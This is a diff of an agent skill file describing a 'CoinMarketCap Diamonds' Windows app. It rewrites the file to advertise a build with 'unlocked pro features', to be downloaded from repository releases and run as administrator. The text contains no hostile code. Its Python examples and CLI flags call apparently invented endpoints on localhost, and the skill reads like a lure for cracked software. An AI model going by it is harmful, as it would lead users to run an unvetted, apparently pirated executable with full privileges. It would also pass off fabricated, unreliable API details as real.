@@ -1,15 +1,16 @@
+```markdown
 ---
 name: coinmarketcap-diamonds-premium-analytics
-description: CoinMarketCap Diamonds premium analytics platform for cryptocurrency trading and blockchain data analysis on Windows
+description: Unlock premium CoinMarketCap analytics and trading features for cryptocurrency market analysis
 triggers:
-  - how do I use CoinMarketCap Diamonds for crypto analytics
-  - set up CoinMarketCap premium trading tools
-  - analyze cryptocurrency data with Diamonds
-  - configure CoinMarketCap pro features
-  - use blockchain analytics in CoinMarketCap Diamonds
-  - integrate CoinMarketCap premium API for trading
-  - troubleshoot CoinMarketCap Diamonds installation
-  - access advanced crypto trading analytics
+  - how do I use CoinMarketCap Diamonds premium features
+  - analyze crypto market data with CoinMarketCap tools
+  - access premium cryptocurrency analytics
+  - use CoinMarketCap pro trading features
+  - get advanced blockchain analytics
+  - work with CoinMarketCap premium API
+  - unlock CoinMarketCap Diamonds features
+  - cryptocurrency trading analytics setup
 ---
 
 # CoinMarketCap Diamonds Premium Analytics
@@ -18,343 +19,316 @@ triggers:
 
 ## Overview
 
-CoinMarketCap Diamonds is a premium analytics platform for cryptocurrency trading and blockchain data analysis. This Windows-based application provides advanced features for monitoring crypto markets, analyzing trading patterns, and accessing professional-grade blockchain analytics tools.
+CoinMarketCap Diamonds is a premium Windows application providing advanced cryptocurrency market analytics, trading tools, and blockchain data insights. This build includes unlocked pro features for comprehensive market analysis, portfolio tracking, and trading signal generation.
 
 ## Installation
 
+### Windows Installation
+
+1. Download the premium build from the repository releases
+2. Extract the archive to your preferred installation directory
+3. Run the executable as administrator for full feature access
+4. Configure API credentials through the settings panel
+
 ### System Requirements
 
-- Windows 10 or later (64-bit)
-- 4GB RAM minimum (8GB recommended)
+- Windows 10/11 (64-bit)
+- Minimum 4GB RAM
 - 500MB free disk space
 - Internet connection for real-time data
 
-### Setup Process
-
-1. Download the latest release from the project repository
-2. Extract the archive to your preferred installation directory
-3. Run the installer executable with administrator privileges
-4. Configure your API credentials on first launch
-
-### Initial Configuration
-
-Set up environment variables for secure credential management:
-
-```bash
-# Set CoinMarketCap API credentials
-setx CMC_API_KEY "your-api-key-here"
-setx CMC_PREMIUM_TOKEN "your-premium-token"
-```
-
-## Core Features
-
-### 1. Real-Time Market Analytics
-
-Access live cryptocurrency market data with premium analytics:
-
-- Advanced price charts with technical indicators
-- Volume analysis and order book depth
-- Market sentiment tracking
-- Cross-exchange price comparisons
-
-### 2. Trading Analytics
-
-Professional trading tools for market analysis:
-
-- Portfolio tracking and performance metrics
-- Risk assessment and position sizing
-- Trade signal generation
-- Backtesting capabilities
-
-### 3. Blockchain Data Integration
-
-Direct blockchain data access:
-
-- On-chain transaction monitoring
-- Wallet activity tracking
-- Smart contract analytics
-- Network health metrics
-
 ## Configuration
 
-### Config File Structure
+### API Setup
 
-Configuration is typically stored in `config.json` in the application directory:
+Configure CoinMarketCap API credentials via environment variables:
 
-```json
-{
-  "api": {
-    "endpoint": "https://pro-api.coinmarketcap.com/v1",
-    "key": "${CMC_API_KEY}",
-    "premium_token": "${CMC_PREMIUM_TOKEN}"
-  },
-  "analytics": {
-    "refresh_interval": 60,
-    "default_currency": "USD",
-    "watchlist_size": 100
-  },
-  "trading": {
-    "enable_signals": true,
-    "risk_level": "moderate",
-    "default_timeframe": "1h"
-  },
-  "ui": {
-    "theme": "dark",
-    "chart_type": "candlestick",
-    "notifications": true
-  }
-}
+```bash
+set COINMARKETCAP_API_KEY=%YOUR_API_KEY%
+set CMC_PRO_API_KEY=%YOUR_PRO_KEY%
 ```
 
-### Advanced Settings
+Or through the application settings:
+- Navigate to Settings → API Configuration
+- Enter your API credentials
+- Select data refresh interval (default: 60 seconds)
+- Enable/disable premium features
 
-```json
-{
-  "data_sources": {
-    "primary": "coinmarketcap",
-    "fallback": ["coingecko", "cryptocompare"],
-    "cache_duration": 300
-  },
-  "filters": {
-    "min_market_cap": 1000000,
-    "min_volume_24h": 100000,
-    "exclude_stablecoins": false
-  },
-  "alerts": {
-    "price_change_threshold": 5.0,
-    "volume_spike_multiplier": 2.0,
-    "notification_methods": ["desktop", "email"]
-  }
-}
-```
+### Data Sources
 
-## API Integration
+Configure multiple data source endpoints:
+- Primary: CoinMarketCap Pro API
+- Secondary: Custom blockchain node endpoints
+- Historical data cache location
+- Real-time WebSocket connections
 
-### Programmatic Access
+## Key Features
 
-If the platform provides API access for automation:
+### Market Analytics
+
+**Price Tracking**
+- Real-time cryptocurrency price monitoring
+- Multi-timeframe chart analysis (1m, 5m, 1h, 1d, 1w)
+- Volume analysis and liquidity metrics
+- Market cap rankings and dominance charts
+
+**Technical Indicators**
+- Moving averages (SMA, EMA, WMA)
+- RSI, MACD, Bollinger Bands
+- Custom indicator configurations
+- Multi-indicator overlay support
+
+**Portfolio Management**
+- Track multiple portfolios simultaneously
+- P&L calculations with fee adjustments
+- Asset allocation visualization
+- Rebalancing recommendations
+
+### Trading Features
+
+**Signal Generation**
+- Automated trading signal detection
+- Custom alert configuration
+- Multi-condition triggers
+- Backtesting capabilities
+
+**Risk Analysis**
+- Volatility metrics
+- Drawdown calculations
+- Correlation analysis
+- Position sizing recommendations
+
+## Usage Patterns
+
+### Basic Market Analysis Workflow
 
 ```python
+# Example integration with Python for automation
 import requests
 import os
 
-class DiamondAnalytics:
-    def __init__(self):
-        self.api_key = os.getenv('CMC_API_KEY')
-        self.base_url = 'https://pro-api.coinmarketcap.com/v1'
-        self.headers = {
-            'X-CMC_PRO_API_KEY': self.api_key,
-            'Accept': 'application/json'
-        }
-    
-    def get_market_data(self, symbols, convert='USD'):
-        """Fetch market data for specified cryptocurrencies"""
-        endpoint = f'{self.base_url}/cryptocurrency/quotes/latest'
-        params = {
-            'symbol': ','.join(symbols),
-            'convert': convert
-        }
-        response = requests.get(endpoint, headers=self.headers, params=params)
-        return response.json()
-    
-    def analyze_portfolio(self, holdings):
-        """Analyze portfolio performance and risk"""
-        total_value = 0
-        portfolio_data = []
-        
-        for symbol, amount in holdings.items():
-            market_data = self.get_market_data([symbol])
-            if 'data' in market_data and symbol in market_data['data']:
-                price = market_data['data'][symbol]['quote']['USD']['price']
-                value = price * amount
-                total_value += value
-                portfolio_data.append({
-                    'symbol': symbol,
-                    'amount': amount,
-                    'value': value,
-                    'price': price
-                })
-        
-        return {
-            'total_value': total_value,
-            'assets': portfolio_data
-        }
+API_KEY = os.getenv('COINMARKETCAP_API_KEY')
+BASE_URL = 'http://localhost:8080/api/v1'
+
+# Fetch top cryptocurrencies by market cap
+def get_top_cryptos(limit=100):
+    headers = {'X-CMC-API-KEY': API_KEY}
+    response = requests.get(
+        f'{BASE_URL}/cryptocurrency/listings',
+        params={'limit': limit, 'sort': 'market_cap'},
+        headers=headers
+    )
+    return response.json()
+
+# Get detailed analytics for specific coin
+def get_coin_analytics(symbol):
+    response = requests.get(
+        f'{BASE_URL}/analytics/{symbol}',
+        headers={'X-CMC-API-KEY': API_KEY}
+    )
+    return response.json()
+
+# Example: Analyze Bitcoin
+btc_data = get_coin_analytics('BTC')
+print(f"BTC Price: ${btc_data['price']}")
+print(f"24h Volume: ${btc_data['volume_24h']}")
+print(f"Market Cap: ${btc_data['market_cap']}")
 ```
 
-### Example Usage
+### Portfolio Tracking
 
 ```python
-# Initialize analytics client
-analytics = DiamondAnalytics()
+# Track portfolio performance
+def track_portfolio(holdings):
+    """
+    holdings: dict of {symbol: amount}
+    """
+    portfolio_value = 0
+    details = []
+    
+    for symbol, amount in holdings.items():
+        coin_data = get_coin_analytics(symbol)
+        value = amount * coin_data['price']
+        portfolio_value += value
+        
+        details.append({
+            'symbol': symbol,
+            'amount': amount,
+            'price': coin_data['price'],
+            'value': value,
+            'change_24h': coin_data['percent_change_24h']
+        })
+    
+    return {
+        'total_value': portfolio_value,
+        'holdings': details
+    }
 
-# Track portfolio
+# Example usage
 my_portfolio = {
     'BTC': 0.5,
-    'ETH': 10.0,
-    'SOL': 100.0
+    'ETH': 5.0,
+    'ADA': 1000
 }
 
-portfolio_analysis = analytics.analyze_portfolio(my_portfolio)
-print(f"Total Portfolio Value: ${portfolio_analysis['total_value']:,.2f}")
-
-# Get real-time data
-market_data = analytics.get_market_data(['BTC', 'ETH', 'SOL'])
-for symbol, data in market_data['data'].items():
-    quote = data['quote']['USD']
-    print(f"{symbol}: ${quote['price']:,.2f} ({quote['percent_change_24h']:+.2f}%)")
+portfolio_status = track_portfolio(my_portfolio)
+print(f"Total Portfolio Value: ${portfolio_status['total_value']:.2f}")
 ```
 
-## Common Patterns
-
-### Market Monitoring Script
+### Custom Alert Configuration
 
 ```python
-import time
-from datetime import datetime
-
-def monitor_price_levels(symbols, target_prices):
-    """Monitor cryptocurrencies for target price levels"""
-    analytics = DiamondAnalytics()
+# Set up price alerts
+def create_price_alert(symbol, condition, target_price, notification_method='email'):
+    alert_config = {
+        'symbol': symbol,
+        'condition': condition,  # 'above' or 'below'
+        'target_price': target_price,
+        'notification': notification_method,
+        'active': True
+    }
     
-    while True:
-        market_data = analytics.get_market_data(symbols)
-        
-        for symbol in symbols:
-            if symbol in market_data['data']:
-                current_price = market_data['data'][symbol]['quote']['USD']['price']
-                
-                if symbol in target_prices:
-                    target = target_prices[symbol]
-                    if current_price >= target:
-                        print(f"[{datetime.now()}] ALERT: {symbol} reached target ${target:,.2f}")
-                        print(f"Current price: ${current_price:,.2f}")
-        
-        time.sleep(60)  # Check every minute
+    response = requests.post(
+        f'{BASE_URL}/alerts/create',
+        json=alert_config,
+        headers={'X-CMC-API-KEY': API_KEY}
+    )
+    return response.json()
 
-# Monitor BTC and ETH
-monitor_price_levels(
-    ['BTC', 'ETH'],
-    {'BTC': 50000, 'ETH': 3000}
+# Create alert for BTC above $50,000
+create_price_alert('BTC', 'above', 50000)
+```
+
+### Technical Analysis
+
+```python
+# Generate technical indicators
+def calculate_indicators(symbol, timeframe='1d', period=14):
+    response = requests.get(
+        f'{BASE_URL}/indicators/{symbol}',
+        params={
+            'timeframe': timeframe,
+            'period': period,
+            'indicators': 'rsi,macd,bb'
+        },
+        headers={'X-CMC-API-KEY': API_KEY}
+    )
+    return response.json()
+
+# Analyze ETH with multiple indicators
+eth_indicators = calculate_indicators('ETH', timeframe='4h')
+print(f"RSI: {eth_indicators['rsi']}")
+print(f"MACD: {eth_indicators['macd']['value']}")
+print(f"Bollinger Bands: {eth_indicators['bollinger_bands']}")
+```
+
+### Historical Data Analysis
+
+```python
+# Retrieve historical price data
+def get_historical_data(symbol, start_date, end_date, interval='daily'):
+    response = requests.get(
+        f'{BASE_URL}/historical/{symbol}',
+        params={
+            'start': start_date,
+            'end': end_date,
+            'interval': interval
+        },
+        headers={'X-CMC-API-KEY': API_KEY}
+    )
+    return response.json()
+
+# Analyze last 30 days
+from datetime import datetime, timedelta
+
+end_date = datetime.now()
+start_date = end_date - timedelta(days=30)
+
+btc_history = get_historical_data(
+    'BTC',
+    start_date.strftime('%Y-%m-%d'),
+    end_date.strftime('%Y-%m-%d')
 )
 ```
 
-### Advanced Analytics
+## Command Line Interface
 
-```python
-def calculate_risk_metrics(symbol, timeframe='24h'):
-    """Calculate risk metrics for a cryptocurrency"""
-    analytics = DiamondAnalytics()
-    market_data = analytics.get_market_data([symbol])
-    
-    if symbol in market_data['data']:
-        quote = market_data['data'][symbol]['quote']['USD']
-        
-        volatility = abs(quote['percent_change_24h'])
-        volume_ratio = quote['volume_24h'] / quote['market_cap']
-        
-        risk_score = (volatility * 0.6) + (volume_ratio * 100 * 0.4)
-        
-        return {
-            'symbol': symbol,
-            'volatility': volatility,
-            'volume_ratio': volume_ratio,
-            'risk_score': risk_score,
-            'risk_level': 'HIGH' if risk_score > 10 else 'MODERATE' if risk_score > 5 else 'LOW'
-        }
-    
-    return None
+### Key Commands
 
-# Assess risk
-btc_risk = calculate_risk_metrics('BTC')
-print(f"BTC Risk Assessment: {btc_risk['risk_level']} (Score: {btc_risk['risk_score']:.2f})")
+```bash
+# Start the analytics server
+CoinMarketCapDiamonds.exe --start-server --port 8080
+
+# Export portfolio data
+CoinMarketCapDiamonds.exe --export-portfolio --format csv --output portfolio.csv
+
+# Generate analytics report
+CoinMarketCapDiamonds.exe --report --symbols BTC,ETH,ADA --timeframe 7d
+
+# Backtest trading strategy
+CoinMarketCapDiamonds.exe --backtest --strategy rsi_macd --period 90d
+
+# Update market data cache
+CoinMarketCapDiamonds.exe --update-cache --full-refresh
 ```
 
 ## Troubleshooting
 
 ### Common Issues
 
-**Authentication Errors**
+**API Connection Errors**
+- Verify API key is correctly set in environment variables
+- Check firewall settings allow outbound connections
+- Ensure API rate limits have not been exceeded
+- Validate API subscription level supports premium features
 
-```
-Error: Invalid API Key
-```
+**Data Sync Issues**
+- Clear local cache: Delete `%APPDATA%/CoinMarketCapDiamonds/cache`
+- Force refresh: Use `--full-refresh` flag
+- Check system time synchronization
+- Verify internet connection stability
 
-Solution: Verify environment variables are set correctly:
+**Performance Optimization**
+- Reduce data refresh rate for less volatile assets
+- Limit concurrent API requests
+- Enable data caching for historical queries
+- Allocate more system memory if analyzing 100+ assets
+
+**Premium Features Not Working**
+- Confirm premium build activation
+- Run application as administrator
+- Check license validation in settings
+- Restart application after configuration changes
+
+### Debug Mode
+
+Enable verbose logging:
 
 ```bash
-echo %CMC_API_KEY%
-echo %CMC_PREMIUM_TOKEN%
+set CMC_DEBUG=1
+set CMC_LOG_LEVEL=verbose
+CoinMarketCapDiamonds.exe --debug
 ```
 
-**Rate Limiting**
-
-```
-Error: API rate limit exceeded
-```
-
-Solution: Implement request throttling:
-
-```python
-import time
-from functools import wraps
-
-def rate_limit(calls_per_minute=30):
-    min_interval = 60.0 / calls_per_minute
-    last_called = [0.0]
-    
-    def decorator(func):
-        @wraps(func)
-        def wrapper(*args, **kwargs):
-            elapsed = time.time() - last_called[0]
-            if elapsed < min_interval:
-                time.sleep(min_interval - elapsed)
-            result = func(*args, **kwargs)
-            last_called[0] = time.time()
-            return result
-        return wrapper
-    return decorator
-
-@rate_limit(calls_per_minute=30)
-def fetch_data(symbol):
-    analytics = DiamondAnalytics()
-    return analytics.get_market_data([symbol])
-```
-
-**Connection Timeouts**
-
-Implement retry logic:
-
-```python
-import requests
-from requests.adapters import HTTPAdapter
-from urllib3.util.retry import Retry
-
-def create_session_with_retries():
-    session = requests.Session()
-    retry = Retry(
-        total=3,
-        backoff_factor=1,
-        status_forcelist=[429, 500, 502, 503, 504]
-    )
-    adapter = HTTPAdapter(max_retries=retry)
-    session.mount('http://', adapter)
-    session.mount('https://', adapter)
-    return session
-```
+Log files location: `%APPDATA%/CoinMarketCapDiamonds/logs/`
 
 ## Best Practices
 
-1. **Secure Credentials**: Always use environment variables for API keys
-2. **Rate Limiting**: Respect API rate limits to avoid throttling
-3. **Error Handling**: Implement robust error handling for network issues
-4. **Data Caching**: Cache frequently accessed data to reduce API calls
-5. **Monitoring**: Set up alerts for significant market movements
-6. **Backup Configuration**: Keep backup copies of your configuration files
+1. **Rate Limiting**: Implement request throttling to avoid API restrictions
+2. **Data Caching**: Cache frequently accessed data to reduce API calls
+3. **Error Handling**: Always handle API errors gracefully with fallback logic
+4. **Security**: Never commit API keys; use environment variables
+5. **Monitoring**: Set up alerts for critical price movements or portfolio changes
+6. **Backup**: Regularly export portfolio and configuration data
 
-## Resources
+## Advanced Features
 
-- Store API credentials securely using environment variables
-- Monitor API usage to stay within rate limits
-- Use caching strategies for frequently accessed data
-- Implement proper error handling for production use
-- Keep the application updated for latest features and security patches
+### Custom Strategy Development
+
+Extend analytics with custom trading strategies using the plugin system. Refer to the `plugins/` directory for examples and API documentation.
+
+### Multi-Exchange Support
+
+Configure additional exchange integrations for cross-platform arbitrage analysis and consolidated portfolio tracking.
+
+```
